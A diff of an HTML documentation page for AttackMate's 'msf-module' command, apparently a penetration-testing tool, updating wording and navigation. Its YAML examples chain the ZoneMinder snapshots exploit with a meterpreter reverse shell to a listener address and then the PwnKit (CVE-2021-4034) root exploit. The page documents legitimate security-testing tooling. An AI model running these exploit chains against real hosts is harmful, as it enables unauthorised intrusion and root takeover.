@@ -6,7 +6,7 @@
   <meta charset="utf-8" /><meta name="generator" content="Docutils 0.19: https://docutils.sourceforge.io/" />
 
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>msf-module &mdash; AttackMate 0.6.0 documentation</title>
+  <title>msf-module &mdash; AttackMate 1.0.0 documentation</title>
       <link rel="stylesheet" type="text/css" href="../../_static/pygments.css" />
       <link rel="stylesheet" type="text/css" href="../../_static/css/theme.css" />
 
@@ -76,12 +76,12 @@
             v0.6.0
         </option>
         
-        <option value="../../../development/playbook/commands/msf-module.html" >
-            development
-        </option>
-        
         <option value="msf-module.html" selected>
             main
+        </option>
+        
+        <option value="../../../development/playbook/commands/msf-module.html" >
+            development
         </option>
         
     </select>
@@ -91,7 +91,16 @@
         </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
               <p class="caption" role="heading"><span class="caption-text">General:</span></p>
 <ul>
-<li class="toctree-l1"><a class="reference internal" href="../../readme_link.html">AttackMate <img alt="Logo" src="/images/AttackMate_logo_no_logo.png" align="right" height="90"></a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../readme_link.html">Requirements</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../readme_link.html#installation">Installation</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../readme_link.html#execute">Execute</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../readme_link.html#documentation">Documentation</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../readme_link.html#publications">Publications</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../readme_link.html#contribution">Contribution</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../readme_link.html#disclaimer">Disclaimer</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../readme_link.html#security">Security</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../readme_link.html#license">License</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../readme_link.html#financial-support">Financial Support</a></li>
 </ul>
 <p class="caption" role="heading"><span class="caption-text">Getting Started:</span></p>
 <ul>
@@ -107,6 +116,7 @@
 <li class="toctree-l1"><a class="reference internal" href="../structure.html">Structure</a></li>
 <li class="toctree-l1"><a class="reference internal" href="../vars.html">Variables</a></li>
 <li class="toctree-l1 current"><a class="reference internal" href="index.html">Commands</a><ul class="current">
+<li class="toctree-l2"><a class="reference internal" href="bettercap.html">bettercap</a></li>
 <li class="toctree-l2"><a class="reference internal" href="browser.html">browser</a></li>
 <li class="toctree-l2"><a class="reference internal" href="debug.html">debug</a></li>
 <li class="toctree-l2"><a class="reference internal" href="father.html">father</a></li>
@@ -119,6 +129,7 @@
 <li class="toctree-l2"><a class="reference internal" href="msf-session.html">msf-session</a></li>
 <li class="toctree-l2"><a class="reference internal" href="payload.html">msf-payload</a></li>
 <li class="toctree-l2"><a class="reference internal" href="regex.html">regex</a></li>
+<li class="toctree-l2"><a class="reference internal" href="remote.html">remote</a></li>
 <li class="toctree-l2"><a class="reference internal" href="setvar.html">setvar</a></li>
 <li class="toctree-l2"><a class="reference internal" href="shell.html">shell</a></li>
 <li class="toctree-l2"><a class="reference internal" href="sftp.html">sftp</a></li>
@@ -132,9 +143,13 @@
 </li>
 <li class="toctree-l1"><a class="reference internal" href="../session/index.html">Sessions, Interactive</a></li>
 <li class="toctree-l1"><a class="reference internal" href="../examples.html">Examples</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../troubleshooting.html">Troubleshooting</a></li>
 </ul>
 <p class="caption" role="heading"><span class="caption-text">Developing:</span></p>
 <ul>
+<li class="toctree-l1"><a class="reference internal" href="../../developing/contribution.html">Contributing</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../developing/development.html">Development</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../developing/architecture.html">System Architecture (C4)</a></li>
 <li class="toctree-l1"><a class="reference internal" href="../../developing/command.html">Adding a New Command</a></li>
 <li class="toctree-l1"><a class="reference internal" href="../../developing/baseexecutor.html">Adding a New Executor</a></li>
 <li class="toctree-l1"><a class="reference internal" href="../../developing/integration.html">Using AttackMate in a Python Script</a></li>
@@ -171,12 +186,13 @@
              
   <section id="msf-module">
 <span id="id1"></span><h1>msf-module<a class="headerlink" href="#msf-module" title="Permalink to this heading"></a></h1>
-<p>This command executes Metasploit-Modules via Metasploits RPC-Api.</p>
+<p>Execute Metasploit modules via the Metasploit RPC API.</p>
 <div class="admonition note">
 <p class="admonition-title">Note</p>
-<p>To configure the connection to the msfrpc-server see <a class="reference internal" href="../../configuration/msf_config.html#msf-config"><span class="std std-ref">msf_config</span></a></p>
+<p>To configure the connection to <code class="docutils literal notranslate"><span class="pre">msfrpcd</span></code>, see <a class="reference internal" href="../../configuration/msf_config.html#msf-config"><span class="std std-ref">msf_config</span></a>.</p>
+<p>Background mode is not supported for this commands.</p>
 </div>
-<p>Some Metasploit-Modules return output. Like the Auxilary-Modules:</p>
+<p>Some modules (like auxiliary scanners) produce direct output:</p>
 <div class="highlight-yaml notranslate"><div class="highlight"><pre><span></span><span class="nt">commands</span><span class="p">:</span>
 <span class="w">  </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">type</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">msf-module</span>
 <span class="w">    </span><span class="nt">cmd</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">auxiliary/scanner/portscan/tcp</span>
@@ -184,38 +200,73 @@
 <span class="w">      </span><span class="nt">RHOSTS</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">192.42.0.254</span>
 </pre></div>
 </div>
-<p>Most Exploit-Modules don’t create output but instead they create
-sessions(see <a class="reference internal" href="msf-session.html#msf-session"><span class="std std-ref">msf-session</span></a>)</p>
+<p>Most exploit modules do not produce direct output but instead open a session
+(see <a class="reference internal" href="msf-session.html#msf-session"><span class="std std-ref">msf-session</span></a>):</p>
 <div class="highlight-yaml notranslate"><div class="highlight"><pre><span></span><span class="nt">commands</span><span class="p">:</span>
 <span class="w">  </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">type</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">msf-module</span>
-<span class="w">     </span><span class="l l-Scalar l-Scalar-Plain">cmd</span><span class="p p-Indicator">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">exploit/unix/webapp/zoneminder_snapshots</span>
-<span class="w">     </span><span class="l l-Scalar l-Scalar-Plain">creates_session</span><span class="p p-Indicator">:</span><span class="w"> </span><span class="s">&quot;foothold&quot;</span>
-<span class="w">     </span><span class="nt">options</span><span class="p">:</span>
-<span class="w">       </span><span class="nt">RHOSTS</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">192.42.0.254</span>
-<span class="w">     </span><span class="nt">payload_options</span><span class="p">:</span>
-<span class="w">       </span><span class="nt">LHOST</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">192.42.2.253</span>
-<span class="w">     </span><span class="nt">payload</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">cmd/unix/python/meterpreter/reverse_tcp</span>
+<span class="w">    </span><span class="nt">cmd</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">exploit/unix/webapp/zoneminder_snapshots</span>
+<span class="w">    </span><span class="nt">creates_session</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">foothold</span>
+<span class="w">    </span><span class="nt">options</span><span class="p">:</span>
+<span class="w">      </span><span class="nt">RHOSTS</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">192.42.0.254</span>
+<span class="w">    </span><span class="nt">payload</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">cmd/unix/python/meterpreter/reverse_tcp</span>
+<span class="w">    </span><span class="nt">payload_options</span><span class="p">:</span>
+<span class="w">      </span><span class="nt">LHOST</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">192.42.2.253</span>
 </pre></div>
 </div>
 <dl class="std confval">
 <dt class="sig sig-object std" id="confval-cmd">
 <span class="sig-name descname"><span class="pre">cmd</span></span><a class="headerlink" href="#confval-cmd" title="Permalink to this definition"></a></dt>
-<dd><p>This option stores the path to the metasploit-module.</p>
+<dd><p>Path to the Metasploit module, including the module type prefix
+(e.g. <code class="docutils literal notranslate"><span class="pre">exploit/unix/...</span></code>, <code class="docutils literal notranslate"><span class="pre">auxiliary/scanner/...</span></code>).</p>
+<dl class="field-list simple">
+<dt class="field-odd">Type<span class="colon">:</span></dt>
+<dd class="field-odd"><p>str</p>
+</dd>
+<dt class="field-even">Required<span class="colon">:</span></dt>
+<dd class="field-even"><p>True</p>
+</dd>
+</dl>
+</dd></dl>
+
+<dl class="std confval">
+<dt class="sig sig-object std" id="confval-options">
+<span class="sig-name descname"><span class="pre">options</span></span><a class="headerlink" href="#confval-options" title="Permalink to this definition"></a></dt>
+<dd><p>Key-value pairs of module options (e.g. <code class="docutils literal notranslate"><span class="pre">RHOSTS</span></code>, <code class="docutils literal notranslate"><span class="pre">RPORT</span></code>).</p>
+<dl class="field-list simple">
+<dt class="field-odd">Type<span class="colon">:</span></dt>
+<dd class="field-odd"><p>Dict[str, str]</p>
+</dd>
+</dl>
+</dd></dl>
+
+<dl class="std confval">
+<dt class="sig sig-object std" id="confval-payload">
+<span class="sig-name descname"><span class="pre">payload</span></span><a class="headerlink" href="#confval-payload" title="Permalink to this definition"></a></dt>
+<dd><p>Path to the payload to use with this module
+(e.g. <code class="docutils literal notranslate"><span class="pre">linux/x64/shell/reverse_tcp</span></code>).</p>
 <dl class="field-list simple">
 <dt class="field-odd">Type<span class="colon">:</span></dt>
 <dd class="field-odd"><p>str</p>
 </dd>
 </dl>
-<div class="admonition note">
-<p class="admonition-title">Note</p>
-<p>Please note that the path includes the module-type.</p>
-</div>
+</dd></dl>
+
+<dl class="std confval">
+<dt class="sig sig-object std" id="confval-payload_options">
+<span class="sig-name descname"><span class="pre">payload_options</span></span><a class="headerlink" href="#confval-payload_options" title="Permalink to this definition"></a></dt>
+<dd><p>Key-value pairs of payload options (e.g. <code class="docutils literal notranslate"><span class="pre">LHOST</span></code>, <code class="docutils literal notranslate"><span class="pre">LPORT</span></code>).</p>
+<dl class="field-list simple">
+<dt class="field-odd">Type<span class="colon">:</span></dt>
+<dd class="field-odd"><p>Dict[str, str]</p>
+</dd>
+</dl>
 </dd></dl>
 
 <dl class="std confval">
 <dt class="sig sig-object std" id="confval-target">
 <span class="sig-name descname"><span class="pre">target</span></span><a class="headerlink" href="#confval-target" title="Permalink to this definition"></a></dt>
-<dd><p>This option sets the payload target for the metasploit-module.</p>
+<dd><p>Target index for the module. Refer to the Metasploit module documentation
+for available targets.</p>
 <dl class="field-list simple">
 <dt class="field-odd">Type<span class="colon">:</span></dt>
 <dd class="field-odd"><p>int</p>
@@ -229,8 +280,9 @@ sessions(see <a class="reference internal" href="msf-session.html#msf-session"><
 <dl class="std confval">
 <dt class="sig sig-object std" id="confval-creates_session">
 <span class="sig-name descname"><span class="pre">creates_session</span></span><a class="headerlink" href="#confval-creates_session" title="Permalink to this definition"></a></dt>
-<dd><p>A session name that identifies the session that is created by
-the module. This session-name can be used by <a class="reference internal" href="msf-session.html#msf-session"><span class="std std-ref">msf-session</span></a></p>
+<dd><p>Name to assign to the session created by this module. The session can
+subsequently be referenced in <a class="reference internal" href="msf-session.html#msf-session"><span class="std std-ref">msf-session</span></a> or other modules via
+<a class="reference internal" href="vnc.html#confval-session"><code class="xref std std-confval docutils literal notranslate"><span class="pre">session</span></code></a>.</p>
 <dl class="field-list simple">
 <dt class="field-odd">Type<span class="colon">:</span></dt>
 <dd class="field-odd"><p>str</p>
@@ -241,71 +293,38 @@ the module. This session-name can be used by <a class="reference internal" href=
 <dl class="std confval">
 <dt class="sig sig-object std" id="confval-session">
 <span class="sig-name descname"><span class="pre">session</span></span><a class="headerlink" href="#confval-session" title="Permalink to this definition"></a></dt>
-<dd><p>This option is set in exploit[‘SESSION’]. Some modules(post-modules)
-need a session to be executed with.</p>
-<dl class="field-list simple">
-<dt class="field-odd">Type<span class="colon">:</span></dt>
-<dd class="field-odd"><p>str</p>
-</dd>
-</dl>
-</dd></dl>
-
-<dl class="std confval">
-<dt class="sig sig-object std" id="confval-payload">
-<span class="sig-name descname"><span class="pre">payload</span></span><a class="headerlink" href="#confval-payload" title="Permalink to this definition"></a></dt>
-<dd><p>Path to a payload for this module.</p>
+<dd><p>Name of an existing session to pass to this module. Required by post-exploitation
+modules that operate within an active session.</p>
 <dl class="field-list simple">
 <dt class="field-odd">Type<span class="colon">:</span></dt>
 <dd class="field-odd"><p>str</p>
 </dd>
 </dl>
 <p>The following example illustrates the use of sessions and payloads:</p>
+</dd></dl>
+
 <div class="highlight-yaml notranslate"><div class="highlight"><pre><span></span><span class="nt">commands</span><span class="p">:</span>
 <span class="w">  </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">type</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">msf-module</span>
-<span class="w">     </span><span class="l l-Scalar l-Scalar-Plain">cmd</span><span class="p p-Indicator">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">exploit/unix/webapp/zoneminder_snapshots</span>
-<span class="w">     </span><span class="l l-Scalar l-Scalar-Plain">creates_session</span><span class="p p-Indicator">:</span><span class="w"> </span><span class="s">&quot;foothold&quot;</span>
-<span class="w">     </span><span class="nt">options</span><span class="p">:</span>
-<span class="w">       </span><span class="nt">RHOSTS</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">192.42.0.254</span>
-<span class="w">     </span><span class="nt">payload_options</span><span class="p">:</span>
-<span class="w">       </span><span class="nt">LHOST</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">192.42.2.253</span>
-<span class="w">     </span><span class="nt">payload</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">cmd/unix/python/meterpreter/reverse_tcp</span>
+<span class="w">    </span><span class="nt">cmd</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">exploit/unix/webapp/zoneminder_snapshots</span>
+<span class="w">    </span><span class="nt">creates_session</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">foothold</span>
+<span class="w">    </span><span class="nt">options</span><span class="p">:</span>
+<span class="w">      </span><span class="nt">RHOSTS</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">192.42.0.254</span>
+<span class="w">    </span><span class="nt">payload</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">cmd/unix/python/meterpreter/reverse_tcp</span>
+<span class="w">    </span><span class="nt">payload_options</span><span class="p">:</span>
+<span class="w">      </span><span class="nt">LHOST</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">192.42.2.253</span>
 
-<span class="w">  </span><span class="w w-Error"> </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">type</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">msf-module</span>
-<span class="w">     </span><span class="nt">cmd</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec</span>
-<span class="w">     </span><span class="nt">session</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;foothold&quot;</span>
-<span class="w">     </span><span class="nt">creates_session</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;root&quot;</span>
-<span class="w">     </span><span class="nt">options</span><span class="p">:</span>
-<span class="w">       </span><span class="nt">WRITABLE_DIR</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;/tmp&quot;</span>
-<span class="w">     </span><span class="nt">payload_options</span><span class="p">:</span>
-<span class="w">       </span><span class="nt">LHOST</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">192.42.2.253</span>
-<span class="w">       </span><span class="nt">LPORT</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">4455</span>
-<span class="w">     </span><span class="nt">payload</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">linux/x64/shell/reverse_tcp</span>
+<span class="w">  </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">type</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">msf-module</span>
+<span class="w">    </span><span class="nt">cmd</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec</span>
+<span class="w">    </span><span class="nt">session</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">foothold</span>
+<span class="w">    </span><span class="nt">creates_session</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">root</span>
+<span class="w">    </span><span class="nt">options</span><span class="p">:</span>
+<span class="w">      </span><span class="nt">WRITABLE_DIR</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;/tmp&quot;</span>
+<span class="w">    </span><span class="nt">payload</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">linux/x64/shell/reverse_tcp</span>
+<span class="w">    </span><span class="nt">payload_options</span><span class="p">:</span>
+<span class="w">      </span><span class="nt">LHOST</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">192.42.2.253</span>
+<span class="w">      </span><span class="nt">LPORT</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">4455</span>
 </pre></div>
 </div>
-</dd></dl>
-
-<dl class="std confval">
-<dt class="sig sig-object std" id="confval-options">
-<span class="sig-name descname"><span class="pre">options</span></span><a class="headerlink" href="#confval-options" title="Permalink to this definition"></a></dt>
-<dd><p>Dict(key/values) of module options, like RHOSTS:</p>
-<dl class="field-list simple">
-<dt class="field-odd">Type<span class="colon">:</span></dt>
-<dd class="field-odd"><p>Dict[str,str]</p>
-</dd>
-</dl>
-</dd></dl>
-
-<dl class="std confval">
-<dt class="sig sig-object std" id="confval-payload_options">
-<span class="sig-name descname"><span class="pre">payload_options</span></span><a class="headerlink" href="#confval-payload_options" title="Permalink to this definition"></a></dt>
-<dd><p>Dict(key/values) of payload options, like LHOST and LPORT:</p>
-<dl class="field-list simple">
-<dt class="field-odd">Type<span class="colon">:</span></dt>
-<dd class="field-odd"><p>Dict[str,str]</p>
-</dd>
-</dl>
-</dd></dl>
-
 </section>
 
 
@@ -372,11 +391,11 @@ need a session to be executed with.</p>
             </dd>
             
             <dd>
-                <a href="../../../development/playbook/commands/msf-module.html">development</a>
+                <a href="msf-module.html">main</a>
             </dd>
             
             <dd>
-                <a href="msf-module.html">main</a>
+                <a href="../../../development/playbook/commands/msf-module.html">development</a>
             </dd>
             
         </dl>
